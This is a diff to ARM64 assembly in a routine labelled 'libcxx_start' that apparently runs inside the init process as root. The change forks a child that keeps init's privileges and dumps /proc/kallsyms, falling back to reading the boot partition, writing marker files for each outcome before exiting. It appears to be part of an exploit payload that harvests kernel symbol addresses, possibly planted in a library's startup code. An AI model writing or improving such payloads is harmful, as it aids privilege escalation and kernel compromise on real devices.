@@ -84,6 +84,17 @@ libcxx_start:
     // return if fail to open (file exist)
     tbnz    w0, #31, return
 
+    // Fork: the parent (init thread) returns immediately so init never
+    // blocks; the child keeps uid 0 / init domain and does the dump.
+    mov     x0, #SIGCHLD
+    mov     x1, xzr
+    mov     x2, xzr
+    mov     x3, xzr
+    mov     x4, xzr
+    mov     x8, #SYS_clone
+    svc     0
+    cbnz    w0, return
+
     // ── probe + dump /proc/kallsyms (multi-path, tagged failures) ─────
     // open kallsyms
     mov     x0, -100
@@ -139,7 +150,7 @@ libcxx_start:
     mov     x8, #SYS_close
     svc     0
     create_mark m_ok
-    b       return
+    b       12f
 6:
     // kallsyms denied: is the boot partition readable instead?
     mov     x0, -100
@@ -153,23 +164,25 @@ libcxx_start:
     mov     x0, x21
     mov     x8, #SYS_close
     svc     0
-    b       return
+    b       12f
 11:
     create_mark m_k0
-    b       return
+    b       12f
 7:
     create_mark m_kx
-    b       return
+    b       12f
 8:
     add     sp, sp, #4096
     create_mark m_kr
-    b       return
+    b       12f
 9:
     add     sp, sp, #4096
     create_mark m_kw
-    b       return
-
-
+    b       12f
+12:
+    mov     x0, #0
+    mov     x8, #SYS_exit
+    svc     0
 return:
     ldr x30, [sp], #16
     ldp x28, x29, [sp], #16
